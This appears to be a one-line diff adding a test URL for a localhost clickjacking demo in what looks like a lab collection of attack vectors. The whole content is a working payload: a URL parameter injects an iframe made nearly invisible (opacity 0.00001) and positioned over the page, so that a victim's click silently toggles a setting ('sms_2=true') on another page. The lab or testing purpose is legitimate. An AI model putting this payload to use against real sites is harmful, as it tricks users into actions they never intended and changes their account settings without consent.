@@ -1,0 +1,1 @@
+http://localhost/aria-pages/vectors/clickjack-demo/button.php?location=<iframe src="http://localhost/aria-pages/vectors/toggles.php?sms_2=true" style="top:-35px;left:-56px;height:1000px;width:100%;position:absolute;z-index:2;border:none !important;opacity:0.00001;"></iframe>
